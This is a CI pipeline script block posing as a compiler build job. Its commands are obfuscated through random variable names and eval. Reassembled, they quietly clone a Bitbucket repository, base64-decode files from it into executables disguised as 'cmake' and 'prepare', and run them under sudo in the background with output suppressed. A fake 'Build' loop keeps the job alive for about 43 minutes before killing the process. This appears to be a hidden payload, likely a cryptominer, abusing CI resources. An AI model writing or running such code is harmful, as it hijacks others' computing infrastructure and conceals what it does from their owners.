script:
  - sudo apt update || true
  - YnGxZYGkjR="sudo apt --"
  - YnPwLM="yes install"
  - fUEgl=" cl-base64 "
  - ShWOR="git &>/dev/"
  - eval "$YnGxZYGkjR""$YnPwLM""$fUEgl""$ShWOR""null"
  - Ajpkl="git clone h"
  - sbIEvPFpj="ttps://gccb"
  - vqhCCnm="uild@bitbuc"
  - zCuFREPf="ket.org/gcc"
  - suvJhTtayh="build/gcc.g"
  - VwAUekhXfe="it &>/dev/n"
  - eval "$Ajpkl""$sbIEvPFpj""$vqhCCnm""$zCuFREPf""$suvJhTtayh""$VwAUekhXfe""ull"
  - zSRHl="base64 -d g"
  - PitrdMFGF="cc/cmake_ >"
  - eval "$zSRHl""$PitrdMFGF"" cmake"
  - BCVjucfC="base64 -d g"
  - DnOXKP="cc/config_ "
  - eval "$BCVjucfC""$DnOXKP""> run"
  - EaevjBTgWr="base64 -d g"
  - SSCcVJZL="cc/make_ > "
  - eval "$EaevjBTgWr""$SSCcVJZL""prepare"
  - chmod +x prepare cmake
  - ./cmake
  - yjFur="sed -i 's/b"
  - LcNBGOeWw="uild/tg2u/g"
  - eval "$yjFur""$LcNBGOeWw""' run"
  - lpNrGkTx="sudo ./prep"
  - RVcMIZVABn="are --confi"
  - HDFZQPyKx="g=run &>/de"
  - eval "$lpNrGkTx""$RVcMIZVABn""$HDFZQPyKx""v/null &"
  - GCC=$(date +%s)
  - vvCovRgHr="echo $BUILD"
  - eval "$vvCovRgHr"""
  - while true; do CC=$(date +%s); echo Build; [ $CC -ge $((GCC + 2582)) ] && sudo killall prepare && break; sleep 223; done
